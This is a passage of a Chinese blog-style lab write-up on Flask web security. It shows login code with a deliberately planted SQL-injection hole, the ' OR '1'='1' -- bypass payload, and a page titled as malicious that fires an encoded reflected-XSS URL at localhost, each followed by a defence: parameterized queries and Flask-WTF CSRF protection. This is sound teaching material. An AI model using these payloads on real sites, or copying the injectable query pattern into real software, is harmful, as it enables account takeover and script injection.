class=&#34;string&#34;&gt;&amp;quot;提交新评论&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            comment = escape(request.form.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;newComment&amp;quot;&lt;/span&gt;).strip())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; comment:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dataset.append(comment)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;) == &lt;span class=&#34;string&#34;&gt;&amp;quot;提交&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            query = escape(request.args.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;content&amp;quot;&lt;/span&gt;).strip())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; query:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                sub_dataset = [x &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; dataset &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; query.lower() &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.lower()]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.html&amp;quot;&lt;/span&gt;, query=query, comments=sub_dataset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.html&amp;quot;&lt;/span&gt;, query=query, comments=dataset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/login&amp;#x27;&lt;/span&gt;, methods=[&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;login&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    error = &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 从表单中获取用户名和密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        username = request.form[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        password = request.form[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        connection = sqlite3.connect(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login.db&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cursor = connection.cursor()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 故意引入 SQL 注入的隐患（仅作为演示，实际中不应这么做）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        query = &lt;span class=&#34;string&#34;&gt;f&amp;quot;SELECT * FROM users WHERE username = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;#x27; AND password = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;password&amp;#125;&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cursor.execute(query)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        user = cursor.fetchone()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        connection.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; user:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            session[&lt;span class=&#34;string&#34;&gt;&amp;#x27;logged_in&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            error = &lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid username or password&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login.html&amp;#x27;&lt;/span&gt;, error=error)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/logout&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;logout&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    session.pop(&lt;span class=&#34;string&#34;&gt;&amp;#x27;logged_in&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    app.run(debug=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SQL 注入攻击演示&lt;br&gt;
打开 app.py 后，在 login 里的 username 中输入 &lt;code&gt;&#39; OR &#39;1&#39;=&#39;1&#39; --&lt;/code&gt; ，在 password 中可以不作任何输入，点击登录，可以发现，页面直接跳转到了 index.html。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;原理分析：&lt;br&gt;
最开始的判定代码为： &lt;code&gt;‘SELECT * FROM users WHERE username = &#39;&amp;#123;username&amp;#125;&#39; AND password = &#39;&amp;#123;password&amp;#125;&#39;’&lt;/code&gt; ，当我们输入’ OR ‘1’=‘1’ -- 后，代码就变为了 &lt;code&gt;‘SELECT * FROM users WHERE username = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; AND password = &#39;任意值&#39;’&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;’ OR &#39;：这个片段是试图打破原有 SQL 查询的逻辑，通过添加一个总是为真的条件（‘1’=‘1’）。&lt;br&gt;
此时我们可以知道，‘1’=‘1’永远判定为真&lt;/p&gt;
&lt;p&gt;‘–’：这是 SQL 中的注释标记。在这个上下文中，它的作用是注释掉 SQL 语句的剩余部分，特别是与密码相关的那部分，这样 SQL 服务器就不会检查密码是否正确。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h4 id=&#34;sql防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql防御&#34;&gt;#&lt;/a&gt; SQL 防御：&lt;/h4&gt;
&lt;p&gt;在 app.py 里将 login 函数修改为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/login&amp;#x27;&lt;/span&gt;, methods=[&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;login&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    error = &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        username = request.form[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        password = request.form[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        connection = sqlite3.connect(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login.db&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cursor = connection.cursor()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 使用参数化查询防止 SQL 注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cursor.execute(&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE username = ? AND password = ?&amp;quot;&lt;/span&gt;, (username, password))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        user = cursor.fetchone()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        connection.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; user:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            session[&lt;span class=&#34;string&#34;&gt;&amp;#x27;logged_in&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            error = &lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid username or password&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login.html&amp;#x27;&lt;/span&gt;, error=error)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再次运行后，输入’ OR ‘1’=‘1’ -- 后发现显示 Invalid username or password&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;原理分析&lt;/strong&gt;：为了防御 SQL 攻击，我们应该避免直接将用户的输入拼接到 SQL 查询中。故我采用参数化查询，这种方式可以确保传入的参数不会被解释为 SQL 代码的一部分，而是作为数据处理。在上述 login 函数的修改中，我使用参数化查询替代字符串格式化。&lt;br&gt;
这么设置的好处是应用程序不再对 SQL 注入攻击易受攻击，因为用户输入被安全地处理为查询的一部分，而不是作为 SQL 代码执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h4 id=&#34;csrf攻击设计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf攻击设计&#34;&gt;#&lt;/a&gt; CSRF 攻击设计：&lt;/h4&gt;
&lt;p&gt;设计 CSRF_attack.html 源码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;恶意网站&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 构建目标网站的URL，包括恶意的XSS代码&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; targetUrl = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1:5000/?content=%3Cscript%3Ealert(&amp;#x27;XSS%E5%8F%8D%E5%B0%84%E5%AE%9E%E9%AA%8C%E6%88%90%E5%8A%9F%EF%BC%81&amp;#x27;)%3C%2Fscript%3E&amp;amp;submit=%E6%8F%90%E4%BA%A4&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 利用Image对象发起GET请求，绕过同源策略&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; img = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Image&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        img.&lt;span class=&#34;property&#34;&gt;src&lt;/span&gt; = targetUrl;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;该源码使用转义，将想要输入的 ur &lt;code&gt;l“http://127.0.0.1:5000/?content=&amp;lt;script&amp;gt;alert(&#39;XSS反射实验成功！&#39;)&amp;lt;/script&amp;gt;&amp;amp;submit=提交”&lt;/code&gt;  转义为 “ &lt;code&gt;&amp;quot;http://127.0.0.1:5000/?content=%3Cscript%3Ealert(&#39;XSS%E5%8F%8D%E5%B0%84%E5%AE%9E%E9%AA%8C%E6%88%90%E5%8A%9F%EF%BC%81&#39;)%3C%2Fscript%3E&amp;amp;submit=%E6%8F%90%E4%BA%A4&amp;quot;;&lt;/code&gt; ”&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;构造思路&lt;/strong&gt;：构建恶意 URL：targetUrl 变量中存储了目标网站的 URL，其中包括了一个查询参数 content。这个参数通过 URL 编码嵌入了恶意的 JavaScript 代码，这段代码是&lt;script&gt;alert (‘XSS 反射实验成功！’)&lt;/script&gt;。当目标网站接收到这个请求并处理 content 参数时，假设它没有对这个参数进行适当的清理或转义，那么这段 JavaScript 代码将在用户的浏览器中执行。&lt;/p&gt;
&lt;p&gt;利用 Image 对象发起 GET 请求：通过创建一个 Image 对象并将其 src 属性设置为构建好的恶意 URL，实际上发起了一个对目标 URL 的 GET 请求。这个请求是在不需要用户交互的情况下自动完成的。由于是通过&lt;img&gt;标签加载资源的方式，它可以绕过一些简单的同源策略限制。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;结果展示：在运行 app.py 后浏览器打开 CSRF_attack.html，可以发现 app.py 终端显示被 XSS 反射型攻击成功：&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/ZybtVQejqlP7Ghz.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;选做之如何防御csrf攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#选做之如何防御csrf攻击&#34;&gt;#&lt;/a&gt; 选做之如何防御 CSRF 攻击&lt;/h3&gt;
&lt;p&gt;为了防御 CSRF 攻击，需要使用 POST 请求而不是 GET，并且实施 CSRF 保护&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;首先在终端运行 pip install Flask-WTF 来下载 Flask-WTF 进行 CSRF 保护&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接着修改 app.py 代码如下&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Flask, render_template, request, session, redirect, url_for&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask_wtf &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; FlaskForm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; wtforms &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; StringField, SubmitField&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask_wtf.csrf &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; CSRFProtect&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app.config[&lt;span class=&#34;string&#34;&gt;&amp;#x27;SECRET_KEY&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;fan_xing_yu_is_little_boy_mother&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;csrf = CSRFProtect(app)&lt;/span&gt;&lt;br&gt;&lt;span 